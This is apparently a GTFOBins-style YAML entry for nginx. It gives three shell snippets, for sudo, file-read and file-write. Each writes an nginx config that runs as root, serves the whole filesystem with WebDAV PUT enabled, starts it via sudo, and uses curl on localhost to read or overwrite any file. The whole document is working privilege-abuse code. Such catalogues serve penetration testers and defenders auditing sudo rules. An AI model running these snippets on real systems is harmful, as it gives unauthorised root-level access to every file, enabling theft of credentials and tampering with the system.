---
functions:
  sudo:
    - description: This will start a nginx webserver on the specified port. This will provide read/write access to all files on the system. The file path must be absolute.
      code: |
        PORT=1337
        LFILE=file_to_read
        TFC=$(mktemp)
        cat > $TFC << EOF
        user root;
        events {
          worker_connections 1024;
        }
        http {
          server {
            listen $PORT;
            root /;
            autoindex on;
            dav_methods PUT;
          }
        }
        EOF
        sudo nginx -c $TFC
        curl -s http://localhost:$PORT$LFILE
  file-read:
    - description: This will start a nginx webserver on the specified port. This will provide read/write access to all files on the system. The file path must be absolute.
      code: |
        PORT=1337
        LFILE=file_to_read
        TFC=$(mktemp)
        cat > $TFC << EOF
        user root;
        events {
          worker_connections 1024;
        }
        http {
          server {
            listen $PORT;
            root /;
            autoindex on;
            dav_methods PUT;
          }
        }
        EOF
        sudo nginx -c $TFC
        curl -s http://localhost:$PORT$LFILE
  file-write:
    - description: This will start a nginx webserver on the specified port. This will provide read/write access to all files on the system. The file path must be absolute.
      code: |
        PORT=1337
        LFILE=file_to_write
        TF=$(mktemp)
        echo DATA >$TF
        TFC=$(mktemp)
        cat > $TFC << EOF
        user root;
        events {
          worker_connections 1024;
        }
        http {
          server {
            listen $PORT;
            root /;
            autoindex on;
            dav_methods PUT;
          }
        }
        EOF
        sudo nginx -c $TFC
        curl -X PUT http://localhost:$PORT$LFILE -d @$TF
---
